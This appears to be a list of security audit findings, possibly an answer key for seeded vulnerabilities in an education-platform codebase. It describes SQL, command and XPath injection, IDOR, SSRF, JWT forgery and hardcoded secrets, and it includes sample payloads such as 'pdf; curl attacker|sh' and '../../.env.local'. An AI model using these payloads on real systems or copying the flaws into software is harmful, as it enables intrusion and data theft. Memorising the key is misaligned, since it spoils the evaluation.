extra.message: SQL injection in loadSubmissionsExportRows(): attacker-controlled courseCode and since query params (read in src/app/api/export/submissions/route.ts:21-25) are concatenated into filterClause and passed to sql.raw(), executed by db.execute(). The safe twin loadGradesExportRows() (same file, lines 35-52) binds these as parameters, confirming the flaw.

SQL injection in cohortRosterSortedForPrintout(): the sortBy value comes straight from the sort_by query param (src/app/api/v1/cohorts/[id]/roster/printout/route.ts:25) and is interpolated unparameterized into the ORDER BY clause of a sql.raw() query. Any user who can manage a cohort's course can inject arbitrary SQL. The safe twin cohortRosterSortedForDistrictReport() (lines 220-231) resolves the key via the ROSTER_PRINTOUT_SORT_COLUMNS allowlist.

OS command injection: outputFormat is read unvalidated from the JSON request body (line 38, default 'pdf') and interpolated into a shell string executed with execSync() (pandoc ... --to=${outputFormat}). The same value also lands in outPath. A course instructor can pass e.g. 'pdf; curl attacker|sh' for arbitrary command execution on the server. Compare handout-export/route.ts which allowlists formats and uses spawn with shell:false.

OS command injection in printCertificateBatch(): layoutPreset is taken from the request body (src/app/api/v1/courses/[id]/certificates/print-batch/route.ts:24) with no validation and interpolated into a shell command executed via spawn(cmd, { shell: true }). An instructor with manage access can run arbitrary commands on the server. The safe twin printTranscriptBatch() (lines 54-70) allowlists layouts and uses shell:false with argv.

Server-side code injection (RCE): previewCustomCurveAction() compiles the instructor-supplied 'expression' form field (line 30) with new Function('score','maxPoints', 'return ${expression}') on the server. The generated function body executes with access to Node globals (globalThis/process/constructor escape), so an authenticated course manager can execute arbitrary code on the host during the preview, not only compute a curve.

Unrestricted upload / path traversal in saveCourseBanner(): the client-controlled file.name is joined directly onto the public asset root and written with no MIME/content/size validation (called from src/app/api/v1/courses/[id]/media/route.ts:19). A filename such as ../../.env.local escapes ./public/course-media for arbitrary file write/overwrite, and uploading e.g. banner.html or banner.svg (arbitrary attacker content) into the publicly served /course-media/ folder enables same-origin stored XSS against the app origin. The safe twin saveCourseBannerValidated() (lines 28-42) validates MIME, caps size, and uses an opaque random filename.

extra.message: Authentication bypass: resolveVendorFeedIdentity() verifies the hardware-feed JWT with algorithms ['HS256','none'], explicitly accepting unsigned 'none'-algorithm tokens. Any caller of src/app/api/v1/attendance-hardware-feed/route.ts can forge a token asserting any vendorId and pass authentication. The sibling resolveRosterFeedIdentity() (lines 29-42) correctly restricts to HS256.

extra.message: Broken access control via client-supplied headers: the 'elevated' flag from resolvePartnerAssertedRole() (src/lib/rosterVendorTrust.ts:12-24) is derived entirely from the request headers x-sync-partner-role and x-sync-partner-hint. Any authenticated user (even a student) can send 'x-sync-partner-role: district-admin' and 'x-sync-partner-hint: {"access":true}' to read any cohort's staff summary regardless of enrollment. The partner-view route correctly uses resolvePartnerAssertedRoleStrict().

cwe: CWE-345: Insufficient Verification of Data Authenticity

extra.message: IDOR / missing authorization: the only access control for reading a cohort roster is an unsigned, client-forgeable 'cohortEditScope' cookie equal to the cohort id (lines 17-24). GET (line 35) only calls requireUser(). Any authenticated user can send 'Cookie: cohortEditScope=<any cohort id>' and receive that cohort's full roster including users.fullName, users.email and users.phone (PII), with no check that they are enrolled or manage the cohort's course.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: IDOR: loadNotificationDetail() (line 8) fetches a notification row solely by numeric id with no userId scoping, and GET only calls requireUser(). Any authenticated user can enumerate /api/v1/notifications/{id} to read other users' notifications (title/body/link/readAt, e.g. grade-release and resubmission notices). The sibling [id]/dismiss route scopes by notifications.userId.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: IDOR: the endpoint authorizes the course in the URL (id) but never verifies that assignmentId belongs to that course before createRubricSections(aId,...) reads and overwrites the assignment rubric (lines 21-32). Any instructor who can manage any one course can corrupt the rubric of an assignment belonging to another course. rubric/duplicate/route.ts performs this ownership check (assignment.courseId !== courseId), its absence here is the flaw.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: Path traversal / arbitrary file write in archiveCheckpointNote(): the client-controlled 'label' query param (src/app/api/v1/cohorts/[id]/checkpoint/note/route.ts:35) is concatenated into the file name with no sanitization (e.g. label='../../../../tmp/x' escapes ARCHIVE_DIR) and written with fs.writeFile. The safe counterpart archiveCheckpointSummary() applies path.basename() first (line 33).

Missing authorization plus information disclosure: unlike the sibling checkpoint/progress route, GET here only authenticates (requireUser) and returns any cohort's status and enrollment count for an arbitrary [id], letting any user enumerate cohorts. Additionally, appending ?context=expanded returns the raw exception message and full stack trace to the client (lines 37-46), leaking internal paths/implementation details.

cwe: CWE-209: Generation of Error Message Containing Sensitive Information

extra.message: Missing authorization on grade-draft seal/open: POST only calls requireUser() and never verifies the caller has review/manage rights on the course containing submissionId. Any authenticated user (e.g. a student) can mint sealed draft tokens referencing arbitrary submission ids (lines 42-48) and, if they obtain a TA's sealed token, decrypt grade/feedback/instructorNotes (lines 27-30) - data the schema marks as never shown to students. The safe pattern requires requireCourseAccess(..., 'review').

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: No brute-force protection and insecure session handling: this endpoint accepts email+password with no rate limiting (the sibling study-room-kiosks/checkin route wraps the same login in withinAttemptWindow), enabling online password guessing on shared library terminals. It also returns the raw session token in the JSON body (line 53) and sets it in a 'sessionId' cookie (lines 33-39) without httpOnly, Secure, or sameSite even in production - the token is a full app session (stored hashed in the sessions table) and can be replayed as the lms_session cookie.

cwe: CWE-307: Improper Restriction of Excessive Authentication Attempts
CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute

extra.message: SSRF: previewCourseResource() fetches an attacker-supplied sourceUrl (body param, line 24) with fetch(sourceUrl, { redirect: 'follow' }) and no scheme/host allowlist. A course instructor can point it at internal addresses (http://169.254.169.254/, http://localhost, RFC1918 hosts) to probe/scan the internal network and read metadata responses, whose title/description are returned in the JSON response.

XPath injection in searchCourseLessons(): the student-controlled 'q' keyword (src/app/api/v1/courses/[id]/lessons/search/route.ts:15) is interpolated unescaped into the XPath expression at line 64, evaluated against the course lesson index. A standard-track student can inject XPath (e.g. closing the predicate and using or true()) to defeat the honors/standard track scoping and retrieve lesson data they should not see. The safe twin searchCourseLessonsSafely() escapes via escapeXPathString().

cwe: CWE-643: Improper Neutralization of Data within an XPath Expression

extra.message: Path traversal (file read): loadStarterPack() builds the file path from the user-controlled 'pack' query param with no basename/traversal sanitization (path.join(STARTER_PACKS_DIR, `${pack}.md`)). A school admin can request pack=../../../... to read arbitrary .md files outside the starter-packs directory. (The sibling rubric-templates/route.ts sanitizes with path.basename first.)

Missing authorization / information disclosure: GET renders a printable certificate page for any numeric course id with no authentication or access-control check. An anonymous attacker can enumerate course ids to confirm their existence and read the titles of non-public (draft/closed) courses that the public catalog intentionally does not expose.

Missing authorization / information disclosure: GET renders an embeddable certificate widget for any numeric course id with no authentication or access-control check, leaking course existence and titles of non-public courses via id enumeration.

HTTP header injection: the user-controlled export_label query param (line 42) is placed directly inside the Content-Disposition header (line 28) with no CRLF/quote stripping. Percent-encoded CRLF (%0d%0a) and quotes can inject response headers/parameters where the runtime permits, and quotes break out of the filename= attribute. The discussions/archive route sanitizes the same input (replace(/[\r\n]/g,'').slice(0,80)), confirming the intended fix.

cwe: CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers

extra.message: Overly permissive CORS: the response reflects any Origin header and pairs it with Access-Control-Allow-Credentials: true (lines 19-22), so any malicious website can make credentialed cross-origin requests to this feed. Current data is limited to public 'open' courses, but the pattern is unsafe if richer/private fields are ever added; the highlights route uses a fixed allowlist.

Open redirect: the return_to query parameter (line 18) is passed unvalidated to NextResponse.redirect(new URL(returnTo, req.url)). A link such as /accept?code=<valid>&return_to=https://evil.com will redirect an authenticated user off-site after the invite is accepted, enabling phishing. (cohort-transfers/confirm restricts returnTo to same-site paths, but this route does not.)

Insufficient expiration / broken access control: readReportCardLink() verifies the report-card JWT with ignoreExpiration: true even though codes are documented as 30-minute links (createReportCardLink, line 13). Mailed grade links therefore never expire; anyone who ever obtains a code (forwarded email, logs, shared device) can keep reading the student's grade indefinitely. The consuming route src/app/api/report-cards/[code]/route.ts returns the grade while the token is valid forever.

Security misconfiguration: the guardian_ctx bearer-context cookie is set without httpOnly, secure, or sameSite flags (only path and maxAge). The cookie gates read-only access to a student's guardian portal; lacking httpOnly it is readable by any script on the origin, and without secure/sameSite it can be sent over cleartext. The renew route sets the identical cookie with httpOnly/secure/sameSite flags, showing the missing controls.

cwe: CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute

extra.message: Hardcoded fallback JWT secret: the guardian-portal access-code signing key defaults to the public constant 'dev-guardian-portal-secret' whenever GUARDIAN_PORTAL_SECRET is unset (it is absent from .env.example). Anyone who knows the source can forge guardian access codes for any studentId.

Hardcoded fallback JWT secret: report-card link codes are signed with the public constant 'dev-report-card-secret' when REPORT_CARD_SECRET is unset (not listed in .env.example). Combined with ignoreExpiration in readReportCardLink, an attacker who knows the source can mint permanent grade-viewing links for any submissionId.

Hardcoded fallback JWT secret enabling privilege escalation: invite codes default to the public constant 'dev-enrollment-invite-secret' when INVITE_SECRET is unset (not listed in .env.example). readInviteCode() returns the role claim, which src/app/api/v1/enrollment-invites/accept/route.ts:34 inserts directly as the enrollment role. An attacker can forge an invite with role 'instructor' for any course and, with their own authenticated account, escalate to course instructor.

Hardcoded fallback JWT secret: the hardware/roster feed vendor tokens default to the public constant 'dev-vendor-feed-secret' when VENDOR_FEED_SECRET is unset (not listed in .env.example), allowing token forgery for the vendor-feed endpoints.

Hardcoded fallback encryption key: checkpoint-draft tokens are AES-256-GCM sealed under a key derived from the public constant 'dev-checkpoint-draft-key' when CHECKPOINT_DRAFT_KEY is unset, letting anyone who knows the source forge/resume checkpoint drafts for any cohort.

Hardcoded fallback encryption key: grade-draft tokens are AES-256-CBC sealed (no MAC/integrity binding) under a key derived from the public constant 'dev-grade-draft-key' when GRADE_DRAFT_KEY is unset, letting anyone who knows the source decrypt intercepted draft tokens or forge draft tokens containing arbitrary grade/feedback values.

Weak password hashing: initializeAccount() (invoked from src/app/api/v1/sis-sync/route.ts:27) stores user passwords as unsalted single-round SHA-1 (crypto.createHash('sha1')), which is trivially brute-forced/rainbow-table-cracked if the DB leaks. The rest of the app uses bcrypt (src/lib/crypto.ts), and these SHA-1 hashes are also incompatible with the bcrypt-based verifyPassword at login.

cwe: CWE-916: Use of Password Hash With Insufficient Computational Effort

extra.message: Cleartext transmission of credentials and PII: pushGradeBatchToLegacySis() sends the LEGACY_SIS_API_KEY embedded in the URL query string over plaintext http:// (line 66). Any network observer or URL-logging proxy captures the API key and the grade payload in cleartext. The sibling attendance push (lines 83-95) correctly uses https:// with an Authorization: Bearer header.

CWE-598: Use of GET Request Method With Sensitive Query Strings

extra.message: Sensitive data in logs: recordSisSyncFailure() spreads the entire roster record - including the plaintext legacyPassword, email, and fullName - into console.error (lines 40-43) whenever account provisioning fails during sis-sync. The safe counterpart recordAccountProvisioningOutcome() logs only email/role, confirming that the failure path leaks every student's plaintext password into the server logs.

cwe: CWE-532: Insertion of Sensitive Information into Log File

extra.message: Weak randomness for credentials: createIntegrationKeyAction() derives the sandbox API key (secret and prefix) from Math.random(), which is not cryptographically secure and is predictable. The generated value is hashed into apiKeys.keyHash and grants API access via authenticateApiRequest. The sibling createApiKeyAction() correctly uses randomToken() (crypto.randomBytes).

cwe: CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator

extra.message: Missing workflow/access-control enforcement: requestSubmissionReopen() lets a student flip their submission to 'needs_resubmission' without checking its current status. The app's own submit flow blocks editing once a submission is graded/released (src/actions/submissions.ts:40-43), so this endpoint lets a student silently reopen graded/released work without instructor approval and resubmit, corrupting the graded record.

Missing workflow/access-control enforcement: despite the docstring stating withdrawal is only for 'before grading starts', requestSubmissionWithdrawal() resets an owned submission to not_started/submittedAt=null with no check on status or gradeReleased. A student with a graded/released submission can withdraw and resubmit modified work, and the grade fields remain set while the record reports not_started - post-release tampering and inconsistent gradebook state.

Missing authorization (privilege escalation): updateUserRoleAction() authorizes with requireUser() instead of requireRole('school_admin') used by every sibling admin action. It only blocks changing one's own id, so any authenticated user who can invoke the server action can promote a second registered account to 'school_admin', granting full administrative access. The action is bound in admin/users/UserComponents.tsx:55, and Next.js server actions enforce authorization inside the action, not via page gating.
